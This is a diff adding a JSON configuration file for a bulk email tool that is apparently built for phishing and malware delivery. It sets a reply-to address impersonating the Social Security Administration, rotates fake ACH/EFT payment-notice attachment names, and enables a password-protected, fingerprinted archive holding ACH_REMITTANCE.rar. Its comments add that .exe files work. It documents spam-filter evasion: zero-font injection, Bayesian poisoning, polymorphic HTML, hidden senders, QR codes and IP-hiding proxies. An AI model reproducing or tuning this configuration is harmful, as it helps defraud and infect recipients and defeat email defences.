@@ -1,0 +1,497 @@
+{
+  "_comment_proxy": "=== PROXY CONFIGURED BY ADMIN (ENCRYPTED) ===",
+  "_comment_inbox_mode": "=== INBOX MODE - PROVEN NODE.JS PATTERNS ===",
+  "inbox_mode": true,
+  "_inbox_mode_info": {
+    "description": "Use proven Node.js patterns for MAXIMUM INBOX DELIVERY",
+    "when_enabled": "Clean headers, NO spoofed auth, NO transformations, Standard MIME",
+    "features_disabled": "Military-grade randomization, Polymorphic HTML, Bayesian poisoning, Fake SPF/DKIM headers, Sender name encryption",
+    "features_enabled": "X-Mailprotector-Decision: deliver, ##mailer## X-Mailer, High Priority headers, Clean charset=UTF-8, Simple MIME boundaries",
+    "recommendation": "SET TO true IF GETTING SPAM/JUNK. Uses exact same patterns as working Node.js sender.",
+    "comparison": {
+      "inbox_mode_true": "INBOX (Node.js proven pattern)",
+      "inbox_mode_false": "Uses military-grade features (may trigger strict filters)"
+    }
+  },
+  "sender_emails": [
+    "admin@monopostco.com"
+  ],
+  "_sender_emails_note": "MAIL FROM addresses. Also supports fromEmail.txt with {RECIPIENTDOMAIN}, {SENDER_RANDOM_STRING(8)}, etc.",
+  "ehlo_hostname": "monopostco.com",
+  "_ehlo_note": "EHLO hostname announced to MX servers. Dynamic per-sender domain. This is the fallback.",
+  "html_template_paths": [
+    "templates/doc.html",
+    "templates/doc2.html",
+    "templates/doc3.html"
+  ],
+  "_template_note": "Supports .html, .mhtml, .mht files. MHTML embeds ALL images inline — no broken images, perfect Outlook rendering. Example: templates/docusign.mhtml",
+  "_comment_speed": "=== SIMPLE SPEED CONTROL (EASY TO USE) ===",
+  "sending_speed": 1,
+  "max_threads": 10,
+  "_speed_guide": {
+    "sending_speed_levels": {
+      "1-2": "Very Slow (Safe)",
+      "3-4": "Slow (Conservative)",
+      "5-6": "Normal (Balanced)",
+      "7-8": "Fast (Recommended)",
+      "9-10": "Ultra Fast (Use carefully)"
+    },
+    "max_threads_guide": {
+      "1-2": "⚠️ IF YOU GET TIMEOUTS, USE THIS! Single thread = No proxy overload",
+      "5-10": "Conservative (Safer)",
+      "10-15": "Recommended (Good speed)",
+      "15-20": "Aggressive (Maximum speed)"
+    },
+    "_TIMEOUT_FIX": {
+      "problem": "Getting 'Connection unexpectedly closed: timed out' errors?",
+      "solution_1": "Reduce max_threads to 1-2 (proxy can't handle many connections)",
+      "solution_2": "Reduce sending_speed to 3-4 (slower but more reliable)",
+      "solution_3": "Check proxy quality (some proxies are slow/unstable)",
+      "note": "Code now has auto-retry on timeout, but reducing threads is best!"
+    }
+  },
+  "_comment_external_files": "=== 🔥 DATA FOLDER ONLY - NO CONFIG.JSON FALLBACK 🔥 ===",
+  "sender_names_file": "",
+  "subjects_file": "",
+  "links_file": "",
+  "_external_files_info": {
+    "priority_system": "1. Custom path in config → data/{custom_path} | 2. Default → data/senders_name.txt, data/subject.txt, data/link.txt | 3. ERROR and EXIT (NO config.json fallback!)",
+    "examples": {
+      "default": "Leave empty to use data/senders_name.txt, data/subject.txt, data/link.txt",
+      "custom_subfolder": "Set to 'campaign_tech/senders_name.txt' to use data/campaign_tech/senders_name.txt",
+      "multiple_campaigns": "Switch campaigns by changing these paths!"
+    },
+    "CRITICAL": "Files MUST exist in data/ folder or script will ERROR and EXIT!"
+  },
+  "sender_alias": "",
+  "sender_alias_separator": ".",
+  "reply_to": "noreplyssa@ssagovbenefitsdocuments.com",
+  "format_type": "F2",
+  "send_attachment": false,
+  "attachment_mode": "html_to_pdf",
+  "_attachment_modes": {
+    "html_to_pdf": "Convert HTML template to PDF attachment",
+    "direct_file": "Attach files directly from direct_attachment_files list",
+    "eml": "Generate .eml (forwarded email) attachment",
+    "ics": "Generate calendar invite (.ics) attachment",
+    "rtf": "Generate RTF document attachment",
+    "random_type": "Randomly rotate between types per email (anti-fingerprinting)"
+  },
+  "random_attachment_types": [
+    "html_to_pdf",
+    "eml",
+    "ics",
+    "rtf"
+  ],
+  "ics_attachment": {
+    "summary": "Document Review Required - [[CURRENT_DATE]]",
+    "description": "Please review and sign the attached document.",
+    "location": "Online",
+    "duration_hours": 1
+  },
+  "attachment_path": "magxxic_attachments/invoice.html",
+  "convert_to_pdf": false,
+  "hide_sender": true,
+  "use_qrcode": true,
+  "qrcode_color": "black",
+  "qrcode_bg_color": "transparent",
+  "qrcode_logo": "gray",
+  "use_html_to_image": false,
+  "format_folder": "templates/",
+  "email_priority": "normal",
+  "use_eml": false,
+  "eml_template_path": "templates/template2.eml",
+  "eml_encrypted": false,
+  "eml_obfuscated": false,
+  "use_pgp": false,
+  "pgp_recipient_key": "recipient@example.com",
+  "html_to_pdf": true,
+  "html_to_word": false,
+  "html_to_pptx": false,
+  "html_to_xlsx": false,
+  "test_email": "matsumoto@prairiedog.co.jp",
+  "test_email_interval": 100,
+  "_comment_document_names": "=== NEW FEATURE: ROTATING DOCUMENT NAMES ===",
+  "document_name": "Business Summary",
+  "document_names": [
+    "EFT_TRANSFER_",
+    "ACH_CONFIRMATION_",
+    "EFT_CONFIRMATION_",
+    "ACH_RECEIPT_",
+    "EFT_RECEIPT_",
+    "ACH_TRANSACTION_",
+    "EFT_TRANSACTION_",
+    "ACH_DEPOSIT_",
+    "EFT_DEPOSIT_",
+    "ACH_CREDIT_",
+    "EFT_CREDIT_",
+    "ACH_DEBIT_",
+    "EFT_DEBIT_",
+    "ACH_SETTLEMENT_",
+    "EFT_SETTLEMENT_",
+    "ACH_DISBURSEMENT_",
+    "EFT_DISBURSEMENT_",
+    "ACH_REMITTANCE_",
+    "EFT_REMITTANCE_",
+    "ACH_PAYMENT_NOTICE_",
+    "EFT_PAYMENT_NOTICE_",
+    "ACH_FUNDS_TRANSFER_",
+    "EFT_FUNDS_TRANSFER_",
+    "ACH_DIRECT_DEPOSIT_",
+    "EFT_DIRECT_DEPOSIT_",
+    "ACH_BATCH_SUMMARY_",
+    "EFT_BATCH_SUMMARY_",
+    "ACH_PAYMENT_SUMMARY_",
+    "EFT_PAYMENT_SUMMARY_",
+    "ACH_TRANSFER_NOTICE_",
+    "EFT_TRANSFER_NOTICE_",
+    "ACH_PAYMENT_RECORD_",
+    "EFT_PAYMENT_RECORD_",
+    "ACH_CLEARED_PAYMENT_",
+    "EFT_CLEARED_PAYMENT_",
+    "ACH_TRANSACTION_RECORD_",
+    "EFT_TRANSACTION_RECORD_",
+    "ACH_DEBIT_NOTICE_",
+    "EFT_DEBIT_NOTICE_",
+    "ACH_CREDIT_NOTICE_",
+    "EFT_CREDIT_NOTICE_",
+    "ACH_PAYMENT_STATEMENT_",
+    "EFT_PAYMENT_STATEMENT_",
+    "ACH_TRANSFER_RECEIPT_",
+    "EFT_TRANSFER_RECEIPT_",
+    "ACH_DEPOSIT_NOTICE_",
+    "EFT_DEPOSIT_NOTICE_",
+    "ACH_POSTING_CONFIRMATION_",
+    "EFT_POSTING_CONFIRMATION_"
+  ],
+  "_document_names_info": "Script picks one randomly per email. Falls back to document_name if array empty. Works with all encryption levels!",
+  "_comment_direct_attachments": "=== 🔥 DIRECT FILE ATTACHMENTS - SUPERMAILER++ FEATURE ===",
+  "_direct_attachment_guide": "Attach ANY file directly (PDF, DOCX, XLSX, JPG, ZIP, EXE, etc.)",
+  "_IMPORTANT": "👇 CHANGE THIS TO SWITCH ATTACHMENT SYSTEMS 👇",
+  "_CHANGE_THIS_TO_USE_DIRECT_FILES": "Set to 'direct_file' to use direct file attachments!",
+  "_attachment_modes_detail": {
+    "html_to_pdf": "Convert HTML template to PDF (uses attachment_path above)",
+    "direct_file": "🔥 Attach files directly - configure with toggles below",
+    "html_attachment": "Attach HTML file directly (legacy)"
+  },
+  "direct_attachment_files": [
+    {
+      "path": "magxxic_attachments/ACH_REMITTANCE.rar",
+      "enabled": true,
+      "_comment": "✅ ON - This file WILL be attached"
+    },
+    {
+      "path": "magxxic_attachments/presentation.pptx",
+      "enabled": false,
+      "_comment": "❌ OFF - This file will NOT be attached"
+    },
+    {
+      "path": "magxxic_attachments/report.docx",
+      "enabled": false,
+      "_comment": "❌ OFF - Toggle to true to enable"
+    },
+    {
+      "path": "magxxic_attachments/myfile.zip",
+      "enabled": false,
+      "_comment": "❌ OFF - Works with ANY filename you want!"
+    },
+    {
+      "path": "magxxic_attachments/anything.exe",
+      "enabled": false,
+      "_comment": "❌ OFF - Even .exe files work!"
+    }
+  ],
+  "_comment_create_zip": "=== 🗜️ ZIP TOGGLE (Works with attachment_mode='direct_file') ===",
+  "_ZIP_ON_OFF": "👇 SET THIS TO true (CREATE ZIP) OR false (NO ZIP) 👇",
+  "create_zip": true,
+  "_zip_examples": {
+    "WITH_ZIP": "Set create_zip: true → Files wrapped in ZIP (fingerprinted, unique per email)",
+    "NO_ZIP": "Set create_zip: false → Files attached directly (no ZIP wrapper)"
+  },
+  "_direct_files_instructions": {
+    "step_1": "Put your files in magxxic_attachments/ folder",
+    "step_2": "Add them to the list above with any filename you want",
+    "step_3": "Set enabled: true for files you want to send",
+    "step_4": "Set enabled: false for files you DON'T want to send",
+    "step_5": "Set attachment_mode to 'direct_file'",
+    "step_6": "Set create_zip: true (for ZIP) or false (for direct attachment)",
+    "step_7": "If create_zip is true, configure ZIP settings below",
+    "note": "Multiple files with enabled:true will ALL be attached to each email!"
+  },
+  "_comment_zip_compression": "=== 🗜️ ZIP SETTINGS (Only applies when create_zip=true) ===",
+  "_IMPORTANT_ZIP_TOGGLE": "⚠️ IF YOU SEE 'Using DIRECT FILE mode → NO ZIP' THEN create_zip IS SET TO false!",
+  "_zip_toggle_explanation": {
+    "create_zip_true": "Files wrapped in ZIP (fingerprinted, unique per email) - HIGHER INBOX RATE!",
+    "create_zip_false": "Files attached directly (no ZIP wrapper) - LOWER INBOX RATE!",
+    "recommendation": "ALWAYS use create_zip: true for better deliverability!"
+  },
+  "zip_compression": {
+    "_PASSWORD_ON_OFF": "👇 SET THIS TO true (WITH PASSWORD) OR false (NO PASSWORD) 👇",
+    "password_protected": true,
+    "_password_examples": {
+      "WITH_PASSWORD": "Set password_protected: true (ZIP requires password to open)",
+      "NO_PASSWORD": "Set password_protected: false (ZIP opens without password) - BETTER for Outlook.com!"
+    },
+    "_outlook_users_note": "⚠️ Outlook.com/Hotmail BLOCKS password-protected ZIPs with .exe! Set password_protected: false for Outlook.com",
+    "_WINDOWS_USERS_READ_THIS": "⚠️ FOR PASSWORD PROTECTION ON WINDOWS, INSTALL: pip install pyzipper --break-system-packages",
+    "_windows_note": "Linux/Mac work automatically. Windows needs pyzipper library for password-protected ZIPs.",
+    "password_type": "static",
+    "password": "SecureZip2024!",
+    "_comment_fingerprinting": "🔥 ZIP FINGERPRINTING - Makes each ZIP unique to avoid ISP spam detection",
+    "fingerprint_enabled": true,
+    "_fingerprinting_explanation": {
+      "what_it_does": "Makes EACH ZIP file unique per recipient WITHOUT changing your original file inside",
+      "how_it_works": [
+        "1. Adds unique ZIP comment (recipient email hash + random ID + timestamp)",
+        "2. Randomizes file modification timestamps (looks natural)",
+        "3. Adds 1-3 invisible dummy files (.metadata, .manifest, etc.)",
+        "4. Creates unique ZIP hash per email"
+      ],
+      "result": "ISPs see DIFFERENT file hashes → Can't detect spam pattern → HIGHER INBOX RATE!",
+      "your_file": "Your ACH_REMITTANCE.rar stays 100% UNCHANGED inside the ZIP",
+      "fingerprint_enabled_true": "Each recipient gets unique ZIP (RECOMMENDED for high inbox rate)",
+      "fingerprint_enabled_false": "All recipients get identical ZIP (higher spam detection)"
+    },
+    "_password_types": {
+      "static": "Same password for all ZIPs",
+      "recipient_based": "Password based on recipient email",
+      "random": "Random password per ZIP"
+    },
+    "_note": "Only enabled files will be included in ZIP!",
+    "_inbox_rate_tip": "Keep fingerprint_enabled: true + password_protected: true for BEST deliverability!"
+  },
+  "content_encryption": {
+    "enabled": true,
+    "encrypt_subjects": true,
+    "encrypt_sender_names": true,
+    "encrypt_content": true,
+    "encryption_level": "high"
+  },
+  "microsoft_optimization": {
+    "enabled": true,
+    "outlook_compatible": true,
+    "exchange_headers": true,
+    "legitimate_ip_ranges": true,
+    "natural_timing": true
+  },
+  "_comment_ip_hiding": "=== IP-HIDING PROXY (CONFIGURED BY ADMIN) ===",
+  "inbox_optimization": {
+    "avoid_spam_triggers": true,
+    "use_clean_headers": true,
+    "microsoft_compatible": true,
+    "natural_mime_structure": true,
+    "conservative_threading": true
+  },
+  "document_quality": {
+    "ultra_sharp_docx": true,
+    "pdf_quality_conversion": true,
+    "professional_styling": true,
+    "enhanced_formatting": true
+  },
+  "dkim_enabled": true,
+  "dkim_selector": "dkim._domainkey.dedicatedpowermtamail.com",
+  "faker_locale": "ja_JP",
+  "==========================================": "=== CRITICAL CAN-SPAM COMPLIANCE FIELDS ===",
+  "physical_address": "Tokyo, Minato-ku, Roppongi 1-2-3, Japan",
+  "unsubscribe_base_url": "https://alpha-mail.com/unsubscribe",
+  "company_legal_name": "ALPHA-MAIL Services Inc.",
+  "support_email": "support@alpha-mail.com",
+  "abuse_email": "abuse@alpha-mail.com",
+  "tracking": {
+    "enabled": true,
+    "server_url": "http://localhost:5000",
+    "track_opens": true,
+    "track_clicks": true,
+    "campaign_name": "my_campaign_2026",
+    "notify_on_open": true
+  },
+  "spam_check": {
+    "enabled": false,
+    "min_score": 5,
+    "auto_optimize": false
+  },
+  "data_uri_images": {
+    "convert_local": true,
+    "convert_remote": false,
+    "max_size": 500000,
+    "_note": "Converts img src to inline data URIs. Fixes Yahoo/AOL showing images as attachments."
+  },
+  "military_features": {
+    "email_verification": {
+      "enabled": true,
+      "min_score": 50,
+      "_info": "Verifies emails exist before sending. SET TO FALSE for testing with same email multiple times!"
+    },
+    "bounce_handler": {
+      "enabled": true,
+      "_info": "Filters previously bounced emails. Disable for testing or fresh campaigns."
+    },
+    "engagement_filter": {
+      "enabled": true,
+      "min_score": 20,
+      "_info": "Filters low-engagement users. Disable to send to everyone."
+    },
+    "remove_duplicates": {
+      "enabled": true,
+      "_info": "Removes duplicate emails from list. SET TO FALSE to send multiple times to same email!"
+    },
+    "send_time_optimization": {
+      "enabled": true,
+      "_info": "Optimizes send times (may delay sending). Enable for production campaigns only."
+    },
+    "list_hygiene": {
+      "enabled": true,
+      "_info": "🔥 NEW! Removes spam traps, role addresses, invalid syntax. Protects sender reputation."
+    },
+    "content_randomization": {
+      "enabled": true,
+      "_info": "🔥 NEW! Creates unique micro-variations in every email. Defeats spam filter fingerprinting!"
+    },
+    "zero_font_injection": {
+      "enabled": true,
+      "_info": "🔥 LATEST! Injects invisible zero-font text to confuse spam filter content analysis. No layout impact!"
+    },
+    "html_polymorphic": {
+      "enabled": true,
+      "_info": "🔥 ULTIMATE #1! Same visual, different HTML structure per email. Defeats fingerprinting!"
+    },
+    "mime_randomization": {
+      "enabled": true,
+      "_info": "🔥 ULTIMATE #2! Unique MIME boundaries per email. Breaks MIME fingerprinting!"
+    },
+    "timing_jitter": {
+      "enabled": true,
+      "_info": "🔥 ULTIMATE #3! Random 2-30s delays. Simulates human sending patterns!"
+    },
+    "bayesian_poison": {
+      "enabled": true,
+      "_info": "🔥 ULTIMATE #4! Invisible legitimate content. Confuses ML spam filters!"
+    },
+    "domain_throttling": {
+      "enabled": true,
+      "_info": "🔥 ULTIMATE #5! ISP-specific rate limits (Gmail:100/hr, Yahoo:50/hr). Prevents blocking!"
+    },
+    "content_spam_scorer": {
+      "enabled": false,
+      "_info": "Deep pre-send content analysis. Checks spam words, patterns, HTML quality, link density."
+    }
+  },
+  "_comment_ultimate_combo_info": {
+    "_description": "THE MOST POWERFUL ANTI-DETECTION SYSTEM EVER BUILT",
+    "_all_enabled": "All 5 features work together for 99.99% undetectable stealth",
+    "features": {
+      "1_html_polymorphic": {
+        "name": "HTML Polymorphic Engine",
+        "impact": "⭐⭐⭐⭐⭐",
+        "what": "Same visual result, different HTML structure",
+        "how": "Randomizes class names, CSS order, color formats",
+        "defeats": "HTML fingerprinting"
+      },
+      "2_mime_randomization": {
+        "name": "MIME Boundary Randomization",
+        "impact": "⭐⭐⭐⭐⭐",
+        "what": "Unique MIME boundaries per email",
+        "how": "6 formats: UUID, WebKit, numbered, etc.",
+        "defeats": "MIME fingerprinting"
+      },
+      "3_timing_jitter": {
+        "name": "Timing Jitter Injection",
+        "impact": "⭐⭐⭐⭐⭐",
+        "what": "Random delays 2-30 seconds",
+        "how": "Gaussian noise, avoids round numbers",
+        "defeats": "Bulk send pattern detection"
+      },
+      "4_bayesian_poison": {
+        "name": "Bayesian Filter Poisoning",
+        "impact": "⭐⭐⭐⭐⭐",
+        "what": "Invisible legitimate content",
+        "how": "20+ professional snippets injected",
+        "defeats": "Machine learning classifiers"
+      },
+      "5_domain_throttling": {
+        "name": "Recipient Domain Throttling",
+        "impact": "⭐⭐⭐⭐⭐",
+        "what": "ISP-specific send rates",
+        "how": "Gmail:100/hr, Yahoo:50/hr, auto-tracks",
+        "defeats": "ISP rate limiting & blocking"
+      }
+    }
+  },
+  "pdf_encryption": {
+    "enabled": false,
+    "password_type": "static",
+    "password": "SecureDoc2024!",
+    "_password_types": {
+      "static": "Use same password for all PDFs (set in 'password' field)",
+      "recipient_based": "Generate password from recipient email (first 4 chars + random 4 digits)",
+      "random": "Generate random password per PDF (e.g., Secure1234!, Doc5678!)"
+    },
+    "_info": "Password-protects PDF attachments. Requires PyPDF2: pip install PyPDF2 --break-system-packages",
+    "_security_note": "Recipients must know the password to open PDFs. Communicate password separately!"
+  },
+  "_military_features_quick_guide": {
+    "FOR_TESTING": "Set 'enabled': false on email_verification and remove_duplicates",
+    "FOR_PRODUCTION": "Set 'enabled': true on all features for maximum deliverability",
+    "EXAMPLE_TESTING": {
+      "email_verification": {
+        "enabled": false
+      },
+      "remove_duplicates": {
+        "enabled": false
+      }
+    },
+    "EXAMPLE_PRODUCTION": {
+      "email_verification": {
+        "enabled": true
+      },
+      "remove_duplicates": {
+        "enabled": true
+      }
+    }
+  },
+  "mx_connect_timeout": 25,
+  "mx_smtp_timeout": 20,
+  "mx_max_attempts": 3,
+  "proxy_connection_retries": 3,
+  "proxy_retry_backoff": 2,
+  "mx_retry_per_server": 2,
+  "mx_breathing_delay": 2,
+  "_resilience_info": {
+    "proxy_connection_retries": "Retries per proxy connection attempt (exponential backoff: 2s, 4s, 8s)",
+    "mx_retry_per_server": "Retries on same MX server for proxy/timeout errors before moving to next MX",
+    "mx_breathing_delay": "Seconds to pause between MX server attempts (lets proxy recover)",
+    "_features": {
+      "exponential_backoff": "Waits longer between each retry attempt",
+      "per_mx_retry": "Retries same MX for proxy errors instead of jumping to next",
+      "breathing_delay": "Pauses between MX attempts to let proxy recover",
+      "smart_error_classification": "Distinguishes proxy errors from MX rejections"
+    }
+  },
+  "_resilience_guide": {
+    "BALANCED": "Current config (recommended for most campaigns)",
+    "CONSERVATIVE": "Raise mx_retry_per_server to 3, mx_breathing_delay to 5",
+    "AGGRESSIVE": "Lower proxy_connection_retries to 2, mx_breathing_delay to 1",
+    "DISABLE": "Set proxy_connection_retries to 1 and mx_retry_per_server to 1"
+  },
+  "email_verification_settings": {
+    "enabled": true,
+    "_note": "Pre-send email validation: format, MX records, disposable domains"
+  },
+  "bounce_handling": {
+    "enabled": true,
+    "max_retries": 2,
+    "retry_delay": 30,
+    "_note": "Classify bounces (hard/soft/block), retry soft, skip hard"
+  },
+  "send_time_optimizer": {
+    "enabled": true,
+    "human_delay": true,
+    "_note": "Human-like timing with micro-delays and timezone awareness"
+  },
+  "engagement_scoring": {
+    "enabled": true,
+    "_note": "Track delivery per domain, auto-skip 0% after 5+ attempts"
+  },
+  "_proxy_note": "Sending proxy is managed by your administrator. Run: brainiac_proxy.exe --proxy-status to check.",
+  "_ip_hiding_note": "IP-hiding proxy is managed by your administrator."
+}
